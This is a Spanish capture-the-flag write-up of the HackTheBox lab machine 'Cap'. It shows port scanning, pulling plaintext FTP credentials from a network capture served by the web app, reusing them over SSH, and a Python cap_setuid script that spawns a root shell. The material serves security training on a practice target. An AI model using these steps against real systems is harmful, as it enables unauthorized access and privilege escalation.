---
title: "Cap - HTB Writeup"
layout: single
excerpt: "Cap es una máquina de dificultad fácil de la plataforma de HackTheBox. En esta máquina accedemos como usuario mediante unas credenciales encontradas en un archivo de captura de red alojado en el servidor web. Para escalar privilegios, abusamos de la capability cap_setuid de python para spawnear una terminal como superusuario"
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/135749919-e4d9b142-df58-4251-8d1d-bb0450898924.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Tshark
  - FTP
  - Capabilities
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/135749978-adb9c3cb-09c3-48ac-9a24-2a0e1cec0806.png)

# Enumeración


Comenzamos enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} con la herramienta `ping`, con esto veremos el estado de la máquina y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Frolic/nmap]
└──╼ $ ping -c 1 10.10.10.111
PING 10.10.10.111 (10.10.10.111) 56(84) bytes of data.
64 bytes from 10.10.10.111: icmp_seq=1 ttl=63 time=65.6 ms

--- 10.10.10.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 65.566/65.566/65.566/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos con la fase de **enumeración de puertos**. Haré uso de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.10.245 -sC -sV -oN targeted
[sudo] password for z3r0byte: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-03 11:43 WEST
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.48% done; ETC: 11:45 (0:00:00 remaining)
Nmap scan report for 10.10.10.245
Host is up (0.075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 03 Oct 2021 10:43:37 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 03 Oct 2021 10:43:31 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 03 Oct 2021 10:43:31 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-title: Security Dashboard
|_http-server-header: gunicorn

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.28 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Vemos que tenemos 3 puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 21 | [FTP](https://www.xataka.com/basics/ftp-que-como-funciona){:target="\_blank"}{:rel="noopener nofollow"} |
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

## FTP

Pruebo a conectarme al servidor FTP con un `anonymous login`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:z3r0byte): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

Pero como vemos, **no está habilitado**. También observo la **versión** del servidor FTP, busco vulnerabilidades asociadas pero tampoco encuentro nada:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ searchsploit vsFTPd 3.0.3
Exploits: No Results
Shellcodes: No Results
```
No encuentro nada interesante el **puerto 21**. Paso a enumerar el servicio **SSH**

## SSH 

La versión de SSH tampoco tiene vulnerabilidades asociadas:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ searchsploit openSSH 8.2
Exploits: No Results
Shellcodes: No Results
```

Paso a enumerar el servidor HTTP.

## HTTP

Hago un pequeño reconocimiento desde la consola antes de abrir el navegador.

Utilizo la herramienta `whatweb` para identificar las **tecnologías** que emplea el servidor:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb 10.10.10.245
http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4],
Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

Vemos tecnologías como [Bootstrap](https://www.hostinger.mx/tutoriales/que-es-bootstrap){:target="\_blank"}{:rel="noopener nofollow"}, [Jquery](https://www.hostinger.mx/tutoriales/que-es-jquery){:target="\_blank"}{:rel="noopener nofollow"} y [Modernizr](https://www.coriaweb.hosting/modernizr-sirve-cuales-variantes/){:target="\_blank"}{:rel="noopener nofollow"}.

Por ahora nada interesante.

# User.txt

Utilizo el navegador para visitar el servidor web:

![image](https://user-images.githubusercontent.com/67548295/135764692-11bf0ad3-04cd-4de9-a41d-2e9a494ef11e.png)

Parece ser un **_dashboard_** en el que ya estamos **registrados**.

Pero al inspeccionar las **cookies** me doy cuenta de que no hay ninguna en uso, asi que deduzco que la web es así **por defecto**.

Vemos un menú a la izquierda con varias cosas:

![image](https://user-images.githubusercontent.com/67548295/135765555-588c9384-bde3-4841-bbad-158be514157a.png)

Empiezo accediendo al apartado de `security snapshots`:

Como dice el apartado, son archivos `pcap`, es decir, **capturas de red**.

Pero como podemos ver, no hay ningun paquete capturado.

Sin embargo, si nos fijamos en la url, podremos ver algo que llama la atención:

![image](https://user-images.githubusercontent.com/67548295/135766012-a67ac0f9-8445-4c74-b946-0dd422f67796.png)

Ruta `/data/1`, lo que debemos de preguntarnos es: ¿Qué pasa si cambio el `1` por otro número?

Bien, pruebo con un `2`:

![image](https://user-images.githubusercontent.com/67548295/135766168-13e69056-aacd-4716-9cd7-7b86de70ca5b.png)

¡Vaya!, parece ser que este es otro archivo `pcap`, ¡y esta vez con contenido!

Descargo el archivo y hago uso de la herramienta `tshark` para poder leer el contenido:

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $tshark -r 2.pcap
    1   0.000000 10.10.10.245 → 10.10.14.20  TCP 68 80 → 54350 [FIN, ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=2268370786 TSecr=564065992
    2   0.000056 10.10.10.245 → 10.10.14.20  TCP 68 80 → 54358 [FIN, ACK] Seq=1 Ack=1 Win=501 Len=0 TSval=2268370786 TSecr=564065991
    3   0.105502  10.10.14.20 → 10.10.10.245 TCP 68 54350 → 80 [FIN, ACK] Seq=1 Ack=2 Win=63 Len=0 TSval=564068987 TSecr=2268370786
    4   0.105525 10.10.10.245 → 10.10.14.20  TCP 68 80 → 54350 [ACK] Seq=2 Ack=2 Win=501 Len=0 TSval=2268370892 TSecr=564068987
    5   0.107507  10.10.14.20 → 10.10.10.245 TCP 68 54358 → 80 [FIN, ACK] Seq=1 Ack=2 Win=63 Len=0 TSval=564068988 TSecr=2268370786
    6   0.107521 10.10.10.245 → 10.10.14.20  TCP 68 80 → 54358 [ACK] Seq=2 Ack=2 Win=501 Len=0 TSval=2268370894 TSecr=564068988
```

Veo que no contiene nada interesante asi que pruebo a añadir otro número en la url.

Pruebo a añadir un `0` en esta ocasión:

![image](https://user-images.githubusercontent.com/67548295/136663176-845e5503-9b93-4d94-ad42-1b5c5fd454e5.png)

Parece ser que es otro archivo `.pcap` diferente. Lo descargo.

Hago uso nuevamente de la herramienta `tshark` para leer el archivo que descargamos:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $tshark -r 0.pcap 2>/dev/null

                 [...]
                 
   36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
   37   4.126526 192.168.196.16 → 192.168.196.1 TCP 56 21 → 54411 [ACK] Seq=21 Ack=14 Win=64256 Len=0
   38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
   39   4.167701 192.168.196.1 → 192.168.196.16 TCP 62 54411 → 21 [ACK] Seq=14 Ack=55 Win=1051136 Len=0
   40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS BXXXXXXXXXXXXX!
   41   5.425034 192.168.196.16 → 192.168.196.1 TCP 56 21 → 54411 [ACK] Seq=55 Ack=36 Win=64256 Len=0
   42   5.432387 192.168.196.16 → 192.168.196.1 FTP 79 Response: 230 Login successful.
  
                  [...]
```
   
¡Unas credenciales! Parece ser que se capturaron paquetes de un **intento de inicio de sesión en el servidor FTP**.

Pruebo a conectarme al `servidor FTP` con las credenciales encontradas:

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:z3r0byte): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Funcionan. Enumero los archivos del servidor FTP y veo que son los del propio sistema.

```bash
ftp> cd / 
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   20 0        0            4096 Jun 01 10:09 .
drwxr-xr-x   20 0        0            4096 Jun 01 10:09 ..
lrwxrwxrwx    1 0        0               7 Jul 31  2020 bin -> usr/bin
drwxr-xr-x    4 0        0            4096 Jul 23 13:25 boot
drwxr-xr-x    2 0        0            4096 May 23 19:17 cdrom
drwxr-xr-x   18 0        0            3980 Oct 09 12:43 dev
drwxr-xr-x   92 0        0            4096 Jul 23 13:25 etc
drwxr-xr-x    3 0        0            4096 May 23 19:17 home
lrwxrwxrwx    1 0        0               7 Jul 31  2020 lib -> usr/lib
lrwxrwxrwx    1 0        0               9 Jul 31  2020 lib32 -> usr/lib32
lrwxrwxrwx    1 0        0               9 Jul 31  2020 lib64 -> usr/lib64
lrwxrwxrwx    1 0        0              10 Jul 31  2020 libx32 -> usr/libx32
drwx------    2 0        0           16384 Sep 23  2020 lost+found
drwxr-xr-x    2 0        0            4096 Jun 01 10:09 media
drwxr-xr-x    2 0        0            4096 May 23 19:17 mnt
drwxr-xr-x    2 0        0            4096 May 23 19:17 opt
dr-xr-xr-x  271 0        0               0 Oct 09 12:42 proc
drwx------    6 0        0            4096 May 27 09:16 root
drwxr-xr-x   27 0        0             820 Oct 09 13:35 run
lrwxrwxrwx    1 0        0               8 Jul 31  2020 sbin -> usr/sbin
drwxr-xr-x    6 0        0            4096 May 23 19:17 snap
drwxr-xr-x    3 0        0            4096 May 23 19:17 srv
dr-xr-xr-x   13 0        0               0 Oct 09 12:42 sys
drwxrwxrwt   12 0        0            4096 Oct 09 13:35 tmp
drwxr-xr-x   15 0        0            4096 May 23 18:36 usr
drwxr-xr-x   14 0        0            4096 May 23 19:17 var
226 Directory send OK.
```

Pienso en **reutilizar** las credenciales en el servidor **SSH** para ver si podemos ingresar a la máquina:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct  9 15:17:25 UTC 2021

  System load:  0.0               Processes:             227
  Usage of /:   36.7% of 8.73GB   Users logged in:       1
  Memory usage: 21%               IPv4 address for eth0: 10.10.10.245
  Swap usage:   0%

  => There are 4 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Oct  9 13:35:59 2021 from 10.10.14.8
nathan@cap:~$ 
```

¡Y sí! Son válidas.

A partir de este punto ya podremos localizar la **flag** `user.txt` en la ruta `/home/nathan/user.txt`:

```bash
nathan@cap:~$ cat /home/nathan/user.txt 
6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXa
```

# Root.txt

Enumero el sistema de forma **manual**, pero a simple vista no encuentro nada, así que empiezo a enumerar el sistema de forma **más profunda**.

Hasta que me doy cuenta de que hay [capabilities](http://www.etl.it.uc3m.es/Linux_Capabilities){:target="\_blank"}{:rel="noopener nofollow"} asignadas.

```bash
nathan@cap:~$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

[...]

```
Las `capabilities` son permisos **especiales** que podemos asignar a archivos, sirven para asignar **permisos específicos**, algo más seguro que asignar `SUID`.

En este caso, `python` tiene la **capability** `cap_setuid` que nos permite cambiar el `uid` del proceso que ejecutemos con `python`.

Es decir, podemos cambiar el `uid` a `0` que corresponde al usuario `root` y **ejecutar código**.

Con un simple script en `python` podríamos _spawnear_ una shell como **superusuario**:

```bash
#!/usr/bin/python3.8

import os # importamos la libreria os para usar funciones del sistema
import pty # libreria TTY para administrar pseudo-terminales

os.setuid(0) # asignamos el UID a 0 para hacer que root sea propietario del proceso de este script
pty.spawn("/bin/bash") # "spawneamos" una full TTY
```

Al ejecutar este script conseguimos una terminal como usuario **root**:

```bash
nathan@cap:/tmp/privesc$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

nathan@cap:/tmp/privesc$ /usr/bin/python3.8 script.py

root@cap:/tmp/privesc# whoami; id
root
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

Ya como usuario root, podemos ver la **flag** `root.txt` en `/root/root.txt`

```bash
root@cap:/tmp/privesc# cat /root/root.txt 
0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX4
```

# Conclusión

En esta máquina nos hemos aprovechado de un fichero de **captura de red** que contenía **credenciales** para conseguir acceso inicial a la máquina por medio de **SSH**.
Escalamos privilegios aprovechando la **capability** `cap_setuid` de `python3.8` que permitía cambiar el **UID** del proceso que ejecutasemos, _spawneamos_ una terminal con el **UID** en `0` (root) y conseguimos permisos de **administrador**.
